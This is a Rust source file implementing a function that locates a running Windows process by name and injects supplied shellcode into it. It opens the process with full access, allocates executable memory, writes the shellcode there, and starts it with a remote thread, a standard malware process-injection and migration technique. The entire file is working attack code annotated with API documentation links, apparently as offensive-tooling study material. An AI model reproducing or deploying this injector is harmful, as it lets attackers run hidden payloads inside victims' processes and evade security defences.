extern crate windows;
use std::{mem, ptr};
use windows::Win32::Foundation::CHAR;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, PROCESSENTRY32, Process32Next, TH32CS_SNAPPROCESS};
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx};
use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};

pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
    // Call CreateToolhelp32Snapshot to get a snapshot of all the processes currently running
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/ToolHelp/fn.CreateToolhelp32Snapshot.html
    let snapshot = unsafe { 
        match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0_u32) {
            Err(_) => panic!("Could not obtain handle to snapshot"),
            Ok(value) => value
        }
    };

    // Call Process32Next to iterate over all processes in the snapshot and look for the target process by name
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/ToolHelp/fn.Process32Next.html
    let mut pid: u32 = 0;
    let mut process_entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
    process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;
    while unsafe { Process32Next(snapshot, &mut process_entry).as_bool() } {
        let mut process_name = String::from("");
        for element in process_entry.szExeFile {
            let element_as_u8 = unsafe { mem::transmute::<CHAR, u8>(element) };
            if element_as_u8 == 0 {
                break
            }
            process_name.push(element_as_u8 as char);
        }
        if process_name.contains(target_process) {
            pid = process_entry.th32ProcessID;
            break;
        }
    }
    if pid == 0 {
        panic!("Could not find a {target_process} process");
    }

    // Call OpenProcess to get a handle to the target process via its PID
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.OpenProcess.html
    let explorer_handle = unsafe { 
        match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
            Err(_) => panic!("Could not open a handle to the process"),
            Ok(value) => value
        }
    };

    // Call VirtualAllocEx to allocate memory for the shellcode
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Memory/fn.VirtualAllocEx.html
    let base_address = unsafe { VirtualAllocEx(explorer_handle, ptr::null(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };

    // Call WriteProcessMemory to write the contents of the shellcode into the memory allocated above
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.WriteProcessMemory.html
    let write_result = unsafe { WriteProcessMemory(explorer_handle, base_address, shellcode.as_ptr() as _, shellcode.len(), ptr::null_mut()) };
    if !write_result.as_bool() {
        panic!("WriteProcessMemory failed");
    }

    // Call CreateRemoteThread to create the execution thread in the target PID
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateRemoteThread.html
    let start_address_option = unsafe { Some(mem::transmute(base_address)) };
    if unsafe { CreateRemoteThread(explorer_handle, ptr::null(), 0, start_address_option, ptr::null(), 0, ptr::null_mut()) }.is_err() {
        panic!("CreateRemoteThread failed");
    }
}
